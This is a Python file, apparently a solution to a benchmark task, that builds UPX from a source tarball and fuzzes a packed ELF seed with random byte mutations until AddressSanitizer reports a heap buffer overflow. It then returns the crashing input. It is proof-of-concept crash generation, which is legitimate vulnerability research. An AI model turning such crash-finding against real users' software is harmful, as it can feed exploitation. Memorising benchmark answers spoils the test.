import os
import sys
import subprocess
import tempfile
import shutil
import tarfile
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        base_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source code
            if src_path.endswith('.tar.gz') or src_path.endswith('.tgz'):
                with tarfile.open(src_path, "r:gz") as tar:
                    tar.extractall(path=base_dir)
            elif src_path.endswith('.tar'):
                with tarfile.open(src_path, "r:") as tar:
                    tar.extractall(path=base_dir)
            else:
                try:
                    with tarfile.open(src_path) as tar:
                        tar.extractall(path=base_dir)
                except:
                    pass

            # 2. Locate build directory (containing Makefile)
            build_dir = base_dir
            for root, dirs, files in os.walk(base_dir):
                if "Makefile" in files:
                    build_dir = root
                    break
            
            # 3. Build the vulnerable binary
            # Ignore errors as 'make all' might fail on docs/tests, but we only need the binary
            try:
                subprocess.call(['make', '-j8'], cwd=build_dir, 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
            
            # 4. Find the 'upx' executable
            upx_bin = None
            for root, dirs, files in os.walk(build_dir):
                if "upx.out" in files:
                    upx_bin = os.path.join(root, "upx.out")
                    break
                if "upx" in files:
                    fpath = os.path.join(root, "upx")
                    if os.access(fpath, os.X_OK):
                        upx_bin = fpath
                        break
            
            # If build failed, we cannot fuzz. Return a best-effort dummy.
            if not upx_bin:
                return b'UPX!' + b'\x00' * 508

            # 5. Create a seed file (Valid ELF)
            seed_elf = os.path.join(base_dir, "seed.elf")
            self._create_seed(seed_elf)
            
            # 6. Pack the seed using the vulnerable UPX
            packed_seed = os.path.join(base_dir, "seed.upx")
            # Try packing with --best for better compression layout
            subprocess.call([upx_bin, '-f', '--best', '-o', packed_seed, seed_elf],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if not os.path.exists(packed_seed):
                # Fallback to default packing
                subprocess.call([upx_bin, '-f', '-o', packed_seed, seed_elf],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if not os.path.exists(packed_seed):
                # If packing fails, we can't generate a valid format to mutate
                return b'UPX!' + b'\x00' * 508

            with open(packed_seed, 'rb') as f:
                seed_data = f.read()

            # 7. Fuzzing Loop
            # We have a valid packed file. We mutate it to trigger the heap buffer overflow 
            # in the decompression logic (p_lx_elf.cpp).
            start_time = time.time()
            while time.time() - start_time < 50:  # Run for up to 50 seconds
                mutated_data = self._mutate(seed_data)
                
                test_path = os.path.join(base_dir, "fuzz.upx")
                with open(test_path, 'wb') as f:
                    f.write(mutated_data)
                
                # Test with -t (test integrity) which triggers decompression
                cmd = [upx_bin, '-t', test_path]
                
                proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                
                # Check for AddressSanitizer crash or Segmentation Fault
                if b"AddressSanitizer" in stderr or b"heap-buffer-overflow" in stderr or proc.returncode < 0:
                    return mutated_data
            
            return seed_data

        except Exception:
            return b'\x00' * 512
        finally:
            shutil.rmtree(base_dir, ignore_errors=True)

    def _create_seed(self, path):
        # Create a minimal shared library ELF
        try:
            with open(path + ".c", "w") as f:
                f.write("int main(){return 0;}")
            # Compile with gcc if available
            subprocess.check_call(["gcc", "-shared", "-fPIC", "-s", "-o", path, path + ".c"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            # Fallback: Write a minimal ELF64 header manually
            # This mimics a basic ELF structure
            header = (
                b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00' # e_ident
                b'\x03\x00\x3e\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' # ET_DYN, AMD64
                b'\x40\x00\x00\x00\x00\x00\x00\x00' # e_phoff
                b'\x00\x00\x00\x00\x00\x00\x00\x00' # e_shoff
                b'\x00\x00\x00\x00' # e_flags
                b'\x40\x00\x38\x00\x01\x00\x00\x00\x00\x00\x00\x00' # sizes
            )
            with open(path, 'wb') as f:
                f.write(header + b'\x00' * 100)

    def _mutate(self, data):
        data = bytearray(data)
        num_mutations = random.randint(1, 5)
        for _ in range(num_mutations):
            idx = random.randint(0, len(data) - 1)
            op = random.randint(0, 2)
            if op == 0:
                # Bit flip
                data[idx] ^= (1 << random.randint(0, 7))
            elif op == 1:
                # Byte overwrite
                data[idx] = random.randint(0, 255)
            elif op == 2:
                # Interesting values
                data[idx] = random.choice([0x00, 0xFF, 0x7F, 0x80])
        return bytes(data)